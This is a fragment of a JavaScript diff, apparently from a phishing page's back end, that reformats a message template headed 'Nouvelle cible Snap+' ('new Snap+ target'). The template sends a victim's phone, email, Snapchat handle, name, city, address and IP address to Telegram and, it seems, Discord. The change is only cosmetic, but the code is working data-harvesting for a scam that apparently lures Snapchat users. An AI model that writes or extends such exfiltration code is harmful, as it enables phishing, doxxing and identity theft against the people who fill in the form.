@@ -220,26 +220,25 @@
 
       // Telegram message (style encadré multi-parties)
       const telegramMessage = `
-┌─🎁 *Nouvelle cible Snap+* @everyone
-│
-│ ┌─📞 Contact
-│ │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
-│ │ ├─ Email     : ${data.get("email") || "N/A"}
-│ │ └─ Snapchat  : ${data.get("snap") || "N/A"}
-│
-│ ├─👤 Identité
-│ │ ├─ Nom      : ${data.get("nom") || "N/A"}
-│ │ ├─ Prénom   : ${data.get("prenom") || "N/A"}
-│
-│ ├─📍 Localisation
-│ │ ├─ Ville        : ${data.get("ville") || "N/A"}
-│ │ ├─ Département  : ${data.get("departement") || "N/A"}
-│ │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
-│
-│ └─🌐 Autres
-│   └─ IP          : ${ip}
-│
-└─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
+🎁 *Nouvelle cible Snap+* 
+  ┌─📞 Contact
+  │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
+  │ ├─ Email     : ${data.get("email") || "N/A"}
+  │ └─ Snapchat  : ${data.get("snap") || "N/A"}
+   
+  ├─👤 Identité
+  │ ├─ Nom      : ${data.get("nom") || "N/A"}
+  │ ├─ Prénom   : ${data.get("prenom") || "N/A"}
+
+  ├─📍 Localisation
+  │ ├─ Ville        : ${data.get("ville") || "N/A"}
+  │ ├─ Département  : ${data.get("departement") || "N/A"}
+  │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
+
+  └─🌐 Autres
+    └─ IP          : ${ip}
+
+🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
 `;
 
       // Envoi Discord
